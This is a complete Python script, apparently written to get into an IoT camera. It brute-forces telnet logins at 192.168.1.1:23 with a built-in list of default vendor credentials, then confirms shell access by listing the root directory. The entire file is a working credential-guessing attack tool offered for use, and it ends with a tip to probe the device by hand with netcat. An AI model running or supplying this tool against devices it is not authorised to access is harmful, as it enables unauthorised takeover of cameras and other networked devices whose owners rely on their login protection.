import socket
import time

# List of credentials to try: (username, password)
CREDENTIALS = [
    ("root", ""),
    ("root", "1234567890"),
    ("root", "123456"),
    ("root", "icatch99"),
    ("root", "admin"),
    ("root", "root"),
    ("root", "ik98765"),
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "1234567890"),
    ("", ""),
]

# Telnet negotiation commands (RFC 854)
IAC  = b'\xff' # Interpret As Command
DONT = b'\xfe'
DO   = b'\xfd'
WONT = b'\xfc'
WILL = b'\xfb'

def handle_telnet_negotiation(sock):
    """
    Handle basic telnet negotiation. 
    If we receive an IAC command (0xff), we read the command and option,
    and reply with a refusal (DONT/WONT) to keep things simple.
    """
    sock.settimeout(0.5)
    data = b""
    try:
        while True:
            char = sock.recv(1)
            if not char:
                break
            if char == IAC:
                cmd = sock.recv(1)
                opt = sock.recv(1)
                # If server says WILL, we say DONT. If server says DO, we say WONT.
                if cmd == WILL:
                    sock.sendall(IAC + DONT + opt)
                elif cmd == DO:
                    sock.sendall(IAC + WONT + opt)
            else:
                data += char
    except socket.timeout:
        pass
    return data

def read_until(sock, expected_list, timeout=2.0):
    """
    Read from socket until one of the expected strings is found or timeout is reached.
    """
    sock.settimeout(timeout)
    buffer = b""
    start_time = time.time()
    try:
        while time.time() - start_time < timeout:
            # First check if we have negotiation bytes to handle
            char = sock.recv(1)
            if not char:
                break
            if char == IAC:
                cmd = sock.recv(1)
                opt = sock.recv(1)
                if cmd == WILL or cmd == DO:
                    # Reply refusing
                    reply_cmd = DONT if cmd == WILL else WONT
                    sock.sendall(IAC + reply_cmd + opt)
            else:
                buffer += char
                text = buffer.decode('utf-8', errors='ignore')
                for expected in expected_list:
                    if expected in text:
                        return text, expected
    except socket.timeout:
        pass
    return buffer.decode('utf-8', errors='ignore'), None

def try_login(username, password, wifi_password=None):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.1.1", 23))
        
        # Read initial banner until login prompt
        text, matched = read_until(s, ["login:", "Username:"], timeout=3.0)
        
        if not matched:
            # Try sending a newline and reading again
            s.sendall(b"\n")
            text, matched = read_until(s, ["login:", "Username:"], timeout=2.0)
            if not matched:
                s.close()
                return False, f"No login prompt found. Buffer: {repr(text)}"
        
        # Send username
        s.sendall(f"{username}\n".encode('utf-8'))
        
        # Read until password prompt or shell prompt
        text, matched = read_until(s, ["Password:", "password:", "#", "$"], timeout=2.0)
        
        if matched in ["#", "$"]:
            s.close()
            return True, f"Logged in with username '{username}' (no password prompt!)."
        
        if not matched:
            s.close()
            return False, f"No password prompt found after sending username. Buffer: {repr(text)}"
        
        # Send password
        s.sendall(f"{password}\n".encode('utf-8'))
        
        # Read response to see if we logged in
        # Success is indicated by shell prompts like #, $, root@, etc.
        # Failure is indicated by "Login incorrect", "incorrect", "login failed"
        text, matched = read_until(s, ["#", "$", "Login incorrect", "incorrect", "login failed"], timeout=3.0)
        
        if matched in ["#", "$"] or any(p in text for p in ["root@", "admin@", "/ #"]):
            # Test executing 'ls'
            s.sendall(b"ls /\n")
            ls_text, _ = read_until(s, ["bin", "usr", "etc", "var"], timeout=1.5)
            s.close()
            return True, f"Success! Output: {repr(text)} | Root dir: {repr(ls_text)}"
        
        s.close()
        return False, f"Failed (incorrect password/login)."
        
    except Exception as e:
        return False, f"Socket error: {e}"

def main():
    print("=========================================")
    print("Camera Telnet Login Bruteforcer")
    print("=========================================")
    
    wifi_pwd = input("Enter your Wi-Fi password (optional, press Enter to skip): ").strip()
    if wifi_pwd:
        # Add Wi-Fi password to credentials to try
        CREDENTIALS.insert(0, ("root", wifi_pwd))
        CREDENTIALS.insert(1, ("admin", wifi_pwd))
    
    print("\n[*] Starting bruteforce on 192.168.1.1:23...")
    for user, pwd in CREDENTIALS:
        print(f"[*] Trying: username={repr(user)}, password={repr(pwd)}...")
        success, message = try_login(user, pwd)
        if success:
            print("\n=========================================")
            print(f"[+] SUCCESSFUL LOGIN FOUND!")
            print(f"[+] Username: {repr(user)}")
            print(f"[+] Password: {repr(pwd)}")
            print(f"[+] Details: {message}")
            print("=========================================")
            return
        else:
            print(f"    [-] {message}")
            
    print("\n[-] Bruteforce completed. No working credentials found.")
    print("[*] Tip: You can try running netcat manually: 'nc 192.168.1.1 23'")
    print("    and experiment with other usernames/passwords.")

if __name__ == "__main__":
    main()
